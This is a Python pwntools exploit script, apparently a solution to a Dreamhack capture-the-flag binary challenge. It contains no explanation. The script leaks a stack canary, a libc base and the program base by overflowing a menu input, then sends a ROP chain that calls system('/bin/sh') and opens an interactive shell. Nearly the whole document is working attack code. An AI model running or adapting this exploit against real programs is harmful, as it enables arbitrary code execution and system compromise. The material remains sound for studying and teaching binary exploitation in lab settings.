from pwn import *

p = process('./main')
# p = remote("host3.dreamhack.games",16753)
e = ELF("./main")
libc = ELF("./libc.so.6")

context.binary = e



p.sendlineafter(b'>', b'2')
p.sendlineafter(b':', b'a'*15)
p.sendlineafter(b'>', b'1')
# p.recvline()
print(p.recvline())
print(p.recvline())
mycanary = p.recvline()[:-1]
# mycanary = u64(recv[0:8])
# mycanary += u64(recv[8:16])
# mycanary += u64(recv[16:24])
# mycanary += u64(recv[24:32])
print(mycanary)


# canary leak
p.sendlineafter(b'>', b'2')
p.sendlineafter(b':', b'a'*0x58)
p.sendlineafter(b'>', b'1')
p.recvuntil(b'a\n')
recv = p.recvline()
canary = u64(b'\x00'+recv[:7])
print("canary:", hex(canary))

# libc leak
p.sendlineafter(b'>', b'2')
p.sendlineafter(b':', b'a'*0x68)
p.sendlineafter(b'>', b'1')
p.recvuntil(b'a\n')
recv = p.recvline().strip()
leak = b'\x00'+ recv[:6] + b'\x00\x00'  # 하위 2바이트를 0으로 설정
libc.address = u64(leak)-0x2a100
print("libc:", hex(libc.address))

# code base leak
p.sendlineafter(b'>', b'2')
p.sendlineafter(b':', b'a'*0x88)
p.sendlineafter(b'>', b'1')
p.recvuntil(b'a\n')
recv = p.recvline().strip()
leak = b'\x00'+ recv[:6] + b'\x00\x00'  # 하위 2바이트를 0으로 설정
e.address = u64(leak) - 0x1200
print("code:", hex(e.address))

# ROP chain
rop_chain = ROP([e, libc], badchars=b'\n')
rop_chain.raw(rop_chain.ret)  # or rop_chain.raw(libc.address + offset_of_ret)
rop_chain.system(next(libc.search(b'/bin/sh\0')))
payload = b'A'*16 + mycanary + b'B'*2 + p64(canary) + b'C'*8 + rop_chain.chain()
p.sendlineafter(b'>', b'2')
p.sendlineafter(b':', payload)
pause()
p.sendlineafter(b'>', b'3')


p.interactive()